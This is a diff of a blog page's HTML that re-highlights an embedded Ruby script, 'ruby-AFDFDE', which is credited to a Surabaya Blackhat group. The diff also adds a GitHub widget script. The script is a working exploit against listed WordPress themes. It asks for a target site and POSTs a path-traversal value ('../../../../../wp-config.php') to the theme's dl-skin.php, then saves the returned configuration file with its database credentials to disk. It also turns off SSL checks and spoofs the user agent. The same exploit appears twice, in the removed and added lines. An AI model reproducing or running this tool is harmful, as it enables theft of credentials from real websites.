@@ -133,7 +133,8 @@ All Staff/Member &hellip;">
 
 <h3>Souce</h3>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span>ruby-AFDFDE.rb </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
@@ -235,108 +236,109 @@ All Staff/Member &hellip;">
 <span class='line-number'>100</span>
 <span class='line-number'>101</span>
 <span class='line-number'>102</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>#!/usr/bin/ruby
-</span><span class='line'>require 'curb';
-</span><span class='line'>require 'fileutils';
-</span><span class='line'>require 'uri';
+</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="c1">#!/usr/bin/ruby</span>
+</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;curb&#39;</span><span class="p">;</span>
+</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;fileutils&#39;</span><span class="p">;</span>
+</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;uri&#39;</span><span class="p">;</span>
 </span><span class='line'>
-</span><span class='line'>#create
-</span><span class='line'>urlInvalid = false;
-</span><span class='line'>themeInvalid = false;
-</span><span class='line'>themeCollection = ["awake","construct","dejavu",
-</span><span class='line'>                  "echelon","elegance","fusion",
-</span><span class='line'>                      "infocus","megastream","method",
-</span><span class='line'>                          "modular","myriad","oakrealty","persuasion"];
-</span><span class='line'>def valid?(url)
-</span><span class='line'>  #url validator
-</span><span class='line'>  uri = URI.parse(url)
-</span><span class='line'>  uri.kind_of?(URI::HTTP)
-</span><span class='line'>rescue URI::InvalidURIError
-</span><span class='line'>  false
-</span><span class='line'>end
+</span><span class='line'><span class="c1">#create</span>
+</span><span class='line'><span class="n">urlInvalid</span> <span class="o">=</span> <span class="kp">false</span><span class="p">;</span>
+</span><span class='line'><span class="n">themeInvalid</span> <span class="o">=</span> <span class="kp">false</span><span class="p">;</span>
+</span><span class='line'><span class="n">themeCollection</span> <span class="o">=</span> <span class="o">[</span><span class="s2">&quot;awake&quot;</span><span class="p">,</span><span class="s2">&quot;construct&quot;</span><span class="p">,</span><span class="s2">&quot;dejavu&quot;</span><span class="p">,</span>
+</span><span class='line'>                  <span class="s2">&quot;echelon&quot;</span><span class="p">,</span><span class="s2">&quot;elegance&quot;</span><span class="p">,</span><span class="s2">&quot;fusion&quot;</span><span class="p">,</span>
+</span><span class='line'>                      <span class="s2">&quot;infocus&quot;</span><span class="p">,</span><span class="s2">&quot;megastream&quot;</span><span class="p">,</span><span class="s2">&quot;method&quot;</span><span class="p">,</span>
+</span><span class='line'>                          <span class="s2">&quot;modular&quot;</span><span class="p">,</span><span class="s2">&quot;myriad&quot;</span><span class="p">,</span><span class="s2">&quot;oakrealty&quot;</span><span class="p">,</span><span class="s2">&quot;persuasion&quot;</span><span class="o">]</span><span class="p">;</span>
+</span><span class='line'><span class="k">def</span> <span class="nf">valid?</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span><span class='line'>  <span class="c1">#url validator</span>
+</span><span class='line'>  <span class="n">uri</span> <span class="o">=</span> <span class="no">URI</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">uri</span><span class="o">.</span><span class="n">kind_of?</span><span class="p">(</span><span class="no">URI</span><span class="o">::</span><span class="no">HTTP</span><span class="p">)</span>
+</span><span class='line'><span class="k">rescue</span> <span class="no">URI</span><span class="o">::</span><span class="no">InvalidURIError</span>
+</span><span class='line'>  <span class="kp">false</span>
+</span><span class='line'><span class="k">end</span>
 </span><span class='line'>
-</span><span class='line'>#coloring
-</span><span class='line'>def colorize(text, color_code)
-</span><span class='line'>  "\e[#{color_code}m#{text}\e[0m"
-</span><span class='line'>end
-</span><span class='line'>#declare the color
-</span><span class='line'>def green(text); colorize(text, 32); end
-</span><span class='line'>def red(text); colorize(text, 31); end
-</span><span class='line'>def yellow(text); colorize(text, 33); end
-</span><span class='line'>def blue(text); colorize(text, 34); end
-</span><span class='line'>def purple(text); colorize(text, 35); end
-</span><span class='line'>def cyan(text); colorize(text, 36); end
+</span><span class='line'><span class="c1">#coloring</span>
+</span><span class='line'><span class="k">def</span> <span class="nf">colorize</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">color_code</span><span class="p">)</span>
+</span><span class='line'>  <span class="s2">&quot;</span><span class="se">\e</span><span class="s2">[</span><span class="si">#{</span><span class="n">color_code</span><span class="si">}</span><span class="s2">m</span><span class="si">#{</span><span class="n">text</span><span class="si">}</span><span class="se">\e</span><span class="s2">[0m&quot;</span>
+</span><span class='line'><span class="k">end</span>
+</span><span class='line'><span class="c1">#declare the color</span>
+</span><span class='line'><span class="k">def</span> <span class="nf">green</span><span class="p">(</span><span class="n">text</span><span class="p">);</span> <span class="n">colorize</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span> <span class="k">end</span>
+</span><span class='line'><span class="k">def</span> <span class="nf">red</span><span class="p">(</span><span class="n">text</span><span class="p">);</span> <span class="n">colorize</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="mi">31</span><span class="p">);</span> <span class="k">end</span>
+</span><span class='line'><span class="k">def</span> <span class="nf">yellow</span><span class="p">(</span><span class="n">text</span><span class="p">);</span> <span class="n">colorize</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="mi">33</span><span class="p">);</span> <span class="k">end</span>
+</span><span class='line'><span class="k">def</span> <span class="nf">blue</span><span class="p">(</span><span class="n">text</span><span class="p">);</span> <span class="n">colorize</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="mi">34</span><span class="p">);</span> <span class="k">end</span>
+</span><span class='line'><span class="k">def</span> <span class="nf">purple</span><span class="p">(</span><span class="n">text</span><span class="p">);</span> <span class="n">colorize</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="mi">35</span><span class="p">);</span> <span class="k">end</span>
+</span><span class='line'><span class="k">def</span> <span class="nf">cyan</span><span class="p">(</span><span class="n">text</span><span class="p">);</span> <span class="n">colorize</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="mi">36</span><span class="p">);</span> <span class="k">end</span>
 </span><span class='line'>
-</span><span class='line'>#begin step
-</span><span class='line'>puts cyan("//github.com/kampoeng/ruby-AFDFDE") + "    : " + red("ruby-AFDFDE Repository")
-</span><span class='line'>puts cyan("//github.com/SurabayaBlackhat/AFDFDE") + " : " + red("Exploit on Github SBH")
-</span><span class='line'>puts cyan("//fb.com/freeeaks") + "                    : " + purple("Vico Ervanda");
-</span><span class='line'>puts cyan("//fb.com/adiebiazajah") + "                : " + purple("SunDi3yansyah");
-</span><span class='line'>puts cyan("//fb.com/100004896060156") + "             : " + purple("CaFc Versace");
-</span><span class='line'>puts cyan("//kampoeng.co.id") + "                     : " + green("Kampoeng Network") + "\n\n";
-</span><span class='line'>puts green("Theme ID : ");
-</span><span class='line'>for i in 0..12
-</span><span class='line'>  puts purple(i.to_s) + " : " + yellow(themeCollection[i]);
-</span><span class='line'>end
-</span><span class='line'>puts "\n";
-</span><span class='line'>begin
-</span><span class='line'>  #trying to get a valid url
-</span><span class='line'>  if urlInvalid == false
-</span><span class='line'>      puts green("Tolong masukan url yang valid");
-</span><span class='line'>  else
-</span><span class='line'>      puts red("url tidak valid");
-</span><span class='line'>  end
-</span><span class='line'>  urlName = gets.gsub("\n","");
-</span><span class='line'>  if(valid?(urlName) === true)
-</span><span class='line'>      isUrlValid = 0;
-</span><span class='line'>  end;
-</span><span class='line'>  urlInvalid=true;
-</span><span class='line'>end while isUrlValid != 0;
-</span><span class='line'>#url now valid, tell the user
-</span><span class='line'>puts yellow("Situs yang vulnerable adalah : ") + cyan(urlName);
-</span><span class='line'>begin
-</span><span class='line'>  #trying to get theme identifier
-</span><span class='line'>  if themeInvalid == false
-</span><span class='line'>      puts green("Tolong masukan tema yang digunakan");
+</span><span class='line'><span class="c1">#begin step</span>
+</span><span class='line'><span class="nb">puts</span> <span class="n">cyan</span><span class="p">(</span><span class="s2">&quot;//github.com/kampoeng/ruby-AFDFDE&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;    : &quot;</span> <span class="o">+</span> <span class="n">red</span><span class="p">(</span><span class="s2">&quot;ruby-AFDFDE Repository&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="nb">puts</span> <span class="n">cyan</span><span class="p">(</span><span class="s2">&quot;//github.com/SurabayaBlackhat/AFDFDE&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot; : &quot;</span> <span class="o">+</span> <span class="n">red</span><span class="p">(</span><span class="s2">&quot;Exploit on Github SBH&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="nb">puts</span> <span class="n">cyan</span><span class="p">(</span><span class="s2">&quot;//fb.com/freeeaks&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;                    : &quot;</span> <span class="o">+</span> <span class="n">purple</span><span class="p">(</span><span class="s2">&quot;Vico Ervanda&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="nb">puts</span> <span class="n">cyan</span><span class="p">(</span><span class="s2">&quot;//fb.com/adiebiazajah&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;                : &quot;</span> <span class="o">+</span> <span class="n">purple</span><span class="p">(</span><span class="s2">&quot;SunDi3yansyah&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="nb">puts</span> <span class="n">cyan</span><span class="p">(</span><span class="s2">&quot;//fb.com/100004896060156&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;             : &quot;</span> <span class="o">+</span> <span class="n">purple</span><span class="p">(</span><span class="s2">&quot;CaFc Versace&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="nb">puts</span> <span class="n">cyan</span><span class="p">(</span><span class="s2">&quot;//kampoeng.co.id&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;                     : &quot;</span> <span class="o">+</span> <span class="n">green</span><span class="p">(</span><span class="s2">&quot;Kampoeng Network&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">;</span>
+</span><span class='line'><span class="nb">puts</span> <span class="n">green</span><span class="p">(</span><span class="s2">&quot;Theme ID : &quot;</span><span class="p">);</span>
+</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="k">in</span> <span class="mi">0</span><span class="o">.</span><span class="n">.</span><span class="mi">12</span>
+</span><span class='line'>  <span class="nb">puts</span> <span class="n">purple</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">to_s</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot; : &quot;</span> <span class="o">+</span> <span class="n">yellow</span><span class="p">(</span><span class="n">themeCollection</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">);</span>
+</span><span class='line'><span class="k">end</span>
+</span><span class='line'><span class="nb">puts</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+</span><span class='line'><span class="k">begin</span>
+</span><span class='line'>  <span class="c1">#trying to get a valid url</span>
+</span><span class='line'>  <span class="k">if</span> <span class="n">urlInvalid</span> <span class="o">==</span> <span class="kp">false</span>
+</span><span class='line'>      <span class="nb">puts</span> <span class="n">green</span><span class="p">(</span><span class="s2">&quot;Tolong masukan url yang valid&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">else</span>
+</span><span class='line'>      <span class="nb">puts</span> <span class="n">red</span><span class="p">(</span><span class="s2">&quot;url tidak valid&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">end</span>
+</span><span class='line'>  <span class="n">urlName</span> <span class="o">=</span> <span class="nb">gets</span><span class="o">.</span><span class="n">gsub</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">valid?</span><span class="p">(</span><span class="n">urlName</span><span class="p">)</span> <span class="o">===</span> <span class="kp">true</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">isUrlValid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>  <span class="k">end</span><span class="p">;</span>
+</span><span class='line'>  <span class="n">urlInvalid</span><span class="o">=</span><span class="kp">true</span><span class="p">;</span>
+</span><span class='line'><span class="k">end</span> <span class="k">while</span> <span class="n">isUrlValid</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="c1">#url now valid, tell the user</span>
+</span><span class='line'><span class="nb">puts</span> <span class="n">yellow</span><span class="p">(</span><span class="s2">&quot;Situs yang vulnerable adalah : &quot;</span><span class="p">)</span> <span class="o">+</span> <span class="n">cyan</span><span class="p">(</span><span class="n">urlName</span><span class="p">);</span>
+</span><span class='line'><span class="k">begin</span>
+</span><span class='line'>  <span class="c1">#trying to get theme identifier</span>
+</span><span class='line'>  <span class="k">if</span> <span class="n">themeInvalid</span> <span class="o">==</span> <span class="kp">false</span>
+</span><span class='line'>      <span class="nb">puts</span> <span class="n">green</span><span class="p">(</span><span class="s2">&quot;Tolong masukan tema yang digunakan&quot;</span><span class="p">);</span>
 </span><span class='line'>      
-</span><span class='line'>  else
-</span><span class='line'>      puts red("tema tidak valid");
-</span><span class='line'>  end
-</span><span class='line'>  themeName = gets.gsub("\n","");
-</span><span class='line'>  if themeName.scan(/([^0-9]+)/).count == 0 and themeName != ""
-</span><span class='line'>      if themeName.to_i &lt; 13 and themeName.to_i > -1
-</span><span class='line'>          isThemeValid = 0;
-</span><span class='line'>      end
-</span><span class='line'>  end
-</span><span class='line'>  themeInvalid = true;
-</span><span class='line'>end while isThemeValid != 0;
-</span><span class='line'>#ok theme is valid, tell the user
-</span><span class='line'>puts yellow("Tema yang terpilih adalah : ") + cyan(themeCollection[themeName.to_i]);
+</span><span class='line'>  <span class="k">else</span>
+</span><span class='line'>      <span class="nb">puts</span> <span class="n">red</span><span class="p">(</span><span class="s2">&quot;tema tidak valid&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">end</span>
+</span><span class='line'>  <span class="n">themeName</span> <span class="o">=</span> <span class="nb">gets</span><span class="o">.</span><span class="n">gsub</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="n">themeName</span><span class="o">.</span><span class="n">scan</span><span class="p">(</span><span class="sr">/([^0-9]+)/</span><span class="p">)</span><span class="o">.</span><span class="n">count</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">themeName</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span>
+</span><span class='line'>      <span class="k">if</span> <span class="n">themeName</span><span class="o">.</span><span class="n">to_i</span> <span class="o">&lt;</span> <span class="mi">13</span> <span class="ow">and</span> <span class="n">themeName</span><span class="o">.</span><span class="n">to_i</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span>
+</span><span class='line'>          <span class="n">isThemeValid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>      <span class="k">end</span>
+</span><span class='line'>  <span class="k">end</span>
+</span><span class='line'>  <span class="n">themeInvalid</span> <span class="o">=</span> <span class="kp">true</span><span class="p">;</span>
+</span><span class='line'><span class="k">end</span> <span class="k">while</span> <span class="n">isThemeValid</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="c1">#ok theme is valid, tell the user</span>
+</span><span class='line'><span class="nb">puts</span> <span class="n">yellow</span><span class="p">(</span><span class="s2">&quot;Tema yang terpilih adalah : &quot;</span><span class="p">)</span> <span class="o">+</span> <span class="n">cyan</span><span class="p">(</span><span class="n">themeCollection</span><span class="o">[</span><span class="n">themeName</span><span class="o">.</span><span class="n">to_i</span><span class="o">]</span><span class="p">);</span>
 </span><span class='line'>
-</span><span class='line'>#download the content using post method
-</span><span class='line'>c = Curl.post( urlName + "/wp-content/themes/"+themeCollection[themeName.to_i] + "/lib/scripts/dl-skin.php",{
-</span><span class='line'>                      '_mysite_download_skin' => '../../../../../wp-config.php'
-</span><span class='line'>                      }) do |curl|
-</span><span class='line'>      curl.ssl_verify_peer = false
-</span><span class='line'>      curl.headers["User-Agent"] = "BlackBerry/3.5.0"
-</span><span class='line'>  end
-</span><span class='line'>#assign the result
-</span><span class='line'>text = c.body_str;
+</span><span class='line'><span class="c1">#download the content using post method</span>
+</span><span class='line'><span class="n">c</span> <span class="o">=</span> <span class="no">Curl</span><span class="o">.</span><span class="n">post</span><span class="p">(</span> <span class="n">urlName</span> <span class="o">+</span> <span class="s2">&quot;/wp-content/themes/&quot;</span><span class="o">+</span><span class="n">themeCollection</span><span class="o">[</span><span class="n">themeName</span><span class="o">.</span><span class="n">to_i</span><span class="o">]</span> <span class="o">+</span> <span class="s2">&quot;/lib/scripts/dl-skin.php&quot;</span><span class="p">,{</span>
+</span><span class='line'>                      <span class="s1">&#39;_mysite_download_skin&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;../../../../../wp-config.php&#39;</span>
+</span><span class='line'>                      <span class="p">})</span> <span class="k">do</span> <span class="o">|</span><span class="n">curl</span><span class="o">|</span>
+</span><span class='line'>      <span class="n">curl</span><span class="o">.</span><span class="n">ssl_verify_peer</span> <span class="o">=</span> <span class="kp">false</span>
+</span><span class='line'>      <span class="n">curl</span><span class="o">.</span><span class="n">headers</span><span class="o">[</span><span class="s2">&quot;User-Agent&quot;</span><span class="o">]</span> <span class="o">=</span> <span class="s2">&quot;BlackBerry/3.5.0&quot;</span>
+</span><span class='line'>  <span class="k">end</span>
+</span><span class='line'><span class="c1">#assign the result</span>
+</span><span class='line'><span class="n">text</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">body_str</span><span class="p">;</span>
 </span><span class='line'>
-</span><span class='line'>#tell the user, what title we use for write to file
-</span><span class='line'>begin 
-</span><span class='line'>  puts green("Please specify a file name (a-zA-Z0-9)");
-</span><span class='line'>  fileName = gets.gsub("\n","");
-</span><span class='line'>  isFileNameValid = fileName.scan(/([^a-zA-Z0-9]+)/).length;
-</span><span class='line'>end while isFileNameValid != 0
-</span><span class='line'>#title ok tell the user
-</span><span class='line'>puts yellow("Judul file yang terpilih adalah : ") + cyan(fileName);
+</span><span class='line'><span class="c1">#tell the user, what title we use for write to file</span>
+</span><span class='line'><span class="k">begin</span>
+</span><span class='line'>  <span class="nb">puts</span> <span class="n">green</span><span class="p">(</span><span class="s2">&quot;Please specify a file name (a-zA-Z0-9)&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">fileName</span> <span class="o">=</span> <span class="nb">gets</span><span class="o">.</span><span class="n">gsub</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">isFileNameValid</span> <span class="o">=</span> <span class="n">fileName</span><span class="o">.</span><span class="n">scan</span><span class="p">(</span><span class="sr">/([^a-zA-Z0-9]+)/</span><span class="p">)</span><span class="o">.</span><span class="n">length</span><span class="p">;</span>
+</span><span class='line'><span class="k">end</span> <span class="k">while</span> <span class="n">isFileNameValid</span> <span class="o">!=</span> <span class="mi">0</span>
+</span><span class='line'><span class="c1">#title ok tell the user</span>
+</span><span class='line'><span class="nb">puts</span> <span class="n">yellow</span><span class="p">(</span><span class="s2">&quot;Judul file yang terpilih adalah : &quot;</span><span class="p">)</span> <span class="o">+</span> <span class="n">cyan</span><span class="p">(</span><span class="n">fileName</span><span class="p">);</span>
 </span><span class='line'>
-</span><span class='line'>          f = File.open(fileName + ".txt", 'w')
-</span><span class='line'>          f.write(text)
-</span><span class='line'>          f.close
-</span><span class='line'>          puts fileName + ".txt - " + green("Downloaded")
-</span><span class='line'>#end step</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'>          <span class="n">f</span> <span class="o">=</span> <span class="no">File</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">fileName</span> <span class="o">+</span> <span class="s2">&quot;.txt&quot;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
+</span><span class='line'>          <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
+</span><span class='line'>          <span class="n">f</span><span class="o">.</span><span class="n">close</span>
+</span><span class='line'>          <span class="nb">puts</span> <span class="n">fileName</span> <span class="o">+</span> <span class="s2">&quot;.txt - &quot;</span> <span class="o">+</span> <span class="n">green</span><span class="p">(</span><span class="s2">&quot;Downloaded&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="c1">#end step</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <h4><a href="https://github.com/kampoeng/ruby-AFDFDE">View Project on Github</a></h4>
@@ -613,7 +615,7 @@ MISI:<br>
   <script src="/javascripts/github.js" type="text/javascript"> </script>
 </section>
 
-<section>
+<script data-name="SurabayaBlackhat" data-modules="base,details,stats,repos,eventsStatis,orgs" data-reposNum="5" src="http://nodejs.in/octocard/bin/octocard.js"> </script><section>
 <h1>Categories</h1>
 <ul id="categories">
 <li class='category'><a href='/article/categories/barrabravaz/'>barrabravaz (1)</a></li>
